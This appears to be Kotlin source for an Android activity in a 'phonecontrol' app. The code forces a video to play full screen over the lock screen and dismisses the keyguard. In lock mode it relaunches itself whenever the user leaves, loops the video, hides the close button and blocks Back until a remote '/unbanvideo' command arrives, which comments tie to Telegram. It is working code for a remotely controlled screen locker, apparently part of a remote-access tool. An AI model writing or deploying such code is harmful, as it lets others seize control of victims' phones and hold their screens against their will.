package com.phonecontrol

import android.content.Context
import android.content.Intent
import android.media.MediaPlayer
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.Gravity
import android.view.SurfaceHolder
import android.view.SurfaceView
import android.view.WindowManager
import android.widget.FrameLayout
import android.widget.ImageButton
import android.widget.ProgressBar
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import kotlinx.coroutines.*
import java.io.File
import java.io.FileOutputStream
import java.net.HttpURLConnection
import java.net.URL

class VideoActivity : AppCompatActivity() {

    private var mediaPlayer: MediaPlayer? = null
    private lateinit var surfaceView: SurfaceView
    private lateinit var closeButton: ImageButton
    private lateinit var progressBar: ProgressBar
    private lateinit var statusText: TextView
    private val handler = Handler(Looper.getMainLooper())
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    private var videoResId: Int = 0
    private var videoUrl: String? = null
    private var lockMode: Boolean = false    // блокировать кнопку HOME
    private var duration: Int = 0            // обязательное время просмотра в сек (0 = без ограничения или до конца)

    private var surfaceReady = false
    private var videoReady = false
    private var videoFile: File? = null
    private var secondsWatched = 0
    private var watchTimer: Job? = null

    companion object {
        private const val TAG = "VideoActivity"
        const val EXTRA_VIDEO_NUM = "video_num"
        const val EXTRA_VIDEO_URL = "video_url"
        const val EXTRA_LOCK = "lock"
        const val EXTRA_DURATION = "duration"

        // Глобальный флаг — ControlService смотрит на него для /unbanvideo
        var lockActive = false

        fun startBuiltin(context: Context, videoNum: Int, lock: Boolean = false, duration: Int = 0) {
            context.startActivity(Intent(context, VideoActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
                putExtra(EXTRA_VIDEO_NUM, videoNum)
                putExtra(EXTRA_LOCK, lock)
                putExtra(EXTRA_DURATION, duration)
            })
        }

        fun startFromUrl(context: Context, url: String, lock: Boolean = false, duration: Int = 0) {
            context.startActivity(Intent(context, VideoActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
                putExtra(EXTRA_VIDEO_URL, url)
                putExtra(EXTRA_LOCK, lock)
                putExtra(EXTRA_DURATION, duration)
            })
        }

        fun unlock() {
            lockActive = false
        }

        fun getCacheFile(context: Context, url: String): File {
            return File(context.cacheDir, "raw_${url.hashCode()}.mp4")
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        window.addFlags(
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
        )

        videoUrl = intent.getStringExtra(EXTRA_VIDEO_URL)
        lockMode = intent.getBooleanExtra(EXTRA_LOCK, false)
        duration = intent.getIntExtra(EXTRA_DURATION, 0)

        val videoNum = intent.getIntExtra(EXTRA_VIDEO_NUM, 0)
        if (videoNum > 0) {
            videoResId = when (videoNum) {
                1 -> R.raw.video1
                2 -> R.raw.video2
                3 -> R.raw.video3
                else -> R.raw.video1
            }
            videoReady = true
        }

        if (lockMode) lockActive = true

        buildUI()

        if (videoUrl != null) downloadVideo(videoUrl!!)
    }

    override fun onPause() {
        super.onPause()
        if (lockActive) {
            val videoNum = this.intent.getIntExtra(EXTRA_VIDEO_NUM, 0)
            val url = videoUrl
            val dur = duration
            handler.postDelayed({
                if (lockActive) {
                    val restart = Intent(applicationContext, VideoActivity::class.java).apply {
                        flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
                        if (videoNum > 0) putExtra(EXTRA_VIDEO_NUM, videoNum)
                        if (url != null) putExtra(EXTRA_VIDEO_URL, url)
                        putExtra(EXTRA_LOCK, true)
                        putExtra(EXTRA_DURATION, dur)
                    }
                    applicationContext.startActivity(restart)
                }
            }, 500L)
        }
    }

    private fun buildUI() {
        val root = FrameLayout(this).apply {
            setBackgroundColor(android.graphics.Color.BLACK)
        }

        surfaceView = SurfaceView(this)
        root.addView(surfaceView, FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT,
            FrameLayout.LayoutParams.MATCH_PARENT,
            Gravity.CENTER
        ))

        progressBar = ProgressBar(this, null, android.R.attr.progressBarStyleHorizontal).apply {
            max = 100
            progress = 0
            visibility = if (videoUrl != null) android.view.View.VISIBLE else android.view.View.GONE
        }
        root.addView(progressBar, FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.MATCH_PARENT, 8, Gravity.BOTTOM
        ).apply { bottomMargin = 100 })

        statusText = TextView(this).apply {
            setTextColor(android.graphics.Color.WHITE)
            textSize = 16f
            text = if (videoUrl != null) "Загрузка видео..." else ""
            visibility = if (videoUrl != null) android.view.View.VISIBLE else android.view.View.GONE
        }
        root.addView(statusText, FrameLayout.LayoutParams(
            FrameLayout.LayoutParams.WRAP_CONTENT,
            FrameLayout.LayoutParams.WRAP_CONTENT,
            Gravity.CENTER
        ))

        // Крестик — скрыт пока не истечёт duration
        closeButton = ImageButton(this).apply {
            setImageResource(android.R.drawable.ic_menu_close_clear_cancel)
            setBackgroundColor(android.graphics.Color.parseColor("#AA000000"))
            alpha = 0f
            setPadding(24, 24, 24, 24)
            setOnClickListener {
                if (!lockMode) finish()
            }
        }
        root.addView(closeButton, FrameLayout.LayoutParams(120, 120, Gravity.TOP or Gravity.END).apply {
            topMargin = 48; rightMargin = 48
        })

        setContentView(root)

        surfaceView.holder.addCallback(object : SurfaceHolder.Callback {
            override fun surfaceCreated(holder: SurfaceHolder) {
                surfaceReady = true
                tryPlay()
            }
            override fun surfaceChanged(holder: SurfaceHolder, f: Int, w: Int, h: Int) {}
            override fun surfaceDestroyed(holder: SurfaceHolder) { surfaceReady = false }
        })
    }

    private fun tryPlay() {
        if (!surfaceReady || !videoReady) return

        try {
            mediaPlayer?.release()
            mediaPlayer = MediaPlayer()

            if (videoResId != 0 && videoUrl == null) {
                val afd = resources.openRawResourceFd(videoResId)
                mediaPlayer!!.setDataSource(afd.fileDescriptor, afd.startOffset, afd.length)
                afd.close()
            } else {
                mediaPlayer!!.setDataSource(videoFile!!.path)
            }

            mediaPlayer!!.setDisplay(surfaceView.holder)
            mediaPlayer!!.setOnVideoSizeChangedListener { _, w, h -> adjustSurfaceSize(w, h) }
            mediaPlayer!!.setOnCompletionListener {
                if (lockMode) {
                    // В режиме блокировки — зацикливаем
                    mediaPlayer?.seekTo(0)
                    mediaPlayer?.start()
                } else {
                    finish()
                }
            }
            mediaPlayer!!.setOnErrorListener { _, what, extra ->
                Log.e(TAG, "MediaPlayer error: $what extra=$extra")
                finish()
                true
            }
            mediaPlayer!!.prepare()
            mediaPlayer!!.start()

            startWatchTimer()

        } catch (e: Exception) {
            Log.e(TAG, "tryPlay failed: ${e.message}", e)
            finish()
        }
    }

    private fun startWatchTimer() {
        watchTimer?.cancel()

        if (duration == 0 && !lockMode) {
            // Нет ограничений — крестик сразу через 3 сек
            handler.postDelayed({ showCloseButton() }, 3000L)
            return
        }

        if (duration == 0 && lockMode) {
            // Бесконечный lock — крестик не показываем
            return
        }

        // Считаем секунды просмотра
        watchTimer = scope.launch {
            while (secondsWatched < duration) {
                delay(1000)
                secondsWatched++
                val remaining = duration - secondsWatched
                if (remaining <= 10 && remaining > 0) {
                    handler.post {
                        statusText.text = "Закрытие через $remaining сек..."
                        statusText.visibility = android.view.View.VISIBLE
                    }
                }
            }
            // Время вышло — показываем крестик (если не lockMode) или закрываем
            handler.post {
                statusText.visibility = android.view.View.GONE
                if (!lockMode) {
                    showCloseButton()
                }
                // В lockMode крестик не появляется — только /unbanvideo из тг
            }
        }
    }

    private fun showCloseButton() {
        closeButton.animate().alpha(1f).setDuration(300).start()
    }

    private fun downloadVideo(url: String) {
        val cacheFile = getCacheFile(this, url)
        if (cacheFile.exists() && cacheFile.length() > 0) {
            videoFile = cacheFile
            videoReady = true
            handler.post {
                progressBar.visibility = android.view.View.GONE
                statusText.visibility = android.view.View.GONE
                tryPlay()
            }
            return
        }

        scope.launch {
            try {
                handler.post { statusText.text = "Скачиваю видео..." }
                val connection = URL(url).openConnection() as HttpURLConnection
                connection.connectTimeout = 15_000
                connection.readTimeout = 30_000
                connection.instanceFollowRedirects = true
                connection.setRequestProperty("User-Agent", "Mozilla/5.0")
                connection.connect()

                val totalSize = connection.contentLength.toLong()
                val tmpFile = File(cacheDir, "tmp_${System.currentTimeMillis()}.mp4")

                connection.inputStream.use { input ->
                    FileOutputStream(tmpFile).use { output ->
                        val buffer = ByteArray(8192)
                        var downloaded = 0L
                        var read: Int
                        while (input.read(buffer).also { read = it } != -1) {
                            output.write(buffer, 0, read)
                            downloaded += read
                            if (totalSize > 0) {
                                val progress = (downloaded * 100 / totalSize).toInt()
                                handler.post {
                                    progressBar.progress = progress
                                    statusText.text = "Загрузка: $progress%"
                                }
                            }
                        }
                    }
                }

                tmpFile.renameTo(cacheFile)
                videoFile = cacheFile
                videoReady = true

                handler.post {
                    progressBar.visibility = android.view.View.GONE
                    statusText.visibility = android.view.View.GONE
                    tryPlay()
                }
            } catch (e: Exception) {
                Log.e(TAG, "Download failed: ${e.message}", e)
                handler.post { statusText.text = "Ошибка: ${e.message}" }
                delay(3000)
                handler.post { finish() }
            }
        }
    }

    private fun adjustSurfaceSize(videoWidth: Int, videoHeight: Int) {
        if (videoWidth == 0 || videoHeight == 0) return
        val screenWidth = resources.displayMetrics.widthPixels
        val screenHeight = resources.displayMetrics.heightPixels
        val scale = minOf(screenWidth.toFloat() / videoWidth, screenHeight.toFloat() / videoHeight)
        val lp = surfaceView.layoutParams as FrameLayout.LayoutParams
        lp.width = (videoWidth * scale).toInt()
        lp.height = (videoHeight * scale).toInt()
        lp.gravity = Gravity.CENTER
        surfaceView.layoutParams = lp
    }

    override fun onBackPressed() {
        if (!lockMode && closeButton.alpha >= 1f) super.onBackPressed()
    }

    override fun onDestroy() {
        handler.removeCallbacksAndMessages(null)
        watchTimer?.cancel()
        scope.cancel()
        try { mediaPlayer?.apply { if (isPlaying) stop(); release() } } catch (e: Exception) { }
        mediaPlayer = null
        if (!lockActive) lockActive = false
        super.onDestroy()
    }
}
